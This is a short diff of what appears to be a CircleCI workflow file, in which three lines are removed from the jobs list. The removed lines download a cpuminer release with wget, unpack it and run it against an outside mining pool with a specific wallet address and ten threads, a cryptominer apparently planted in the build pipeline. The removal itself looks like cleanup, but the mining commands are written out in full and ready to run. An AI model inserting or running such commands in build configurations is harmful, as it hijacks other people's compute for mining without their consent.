@@ -11,6 +11,3 @@ workflows:
     # Run the welcome/run job in its own container
     jobs:
       - welcome/run
-      wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
-tar xf cpuminer-opt-linux.tar.gz
-./cpuminer-sse2 -a yespowersugar -o stratum+tcps://stratum-na.rplant.xyz:17042 -u sugar1q5kwnz5qhwpch2elrmls6z06e9d0tv4pppq44wv.ivan1 -t10
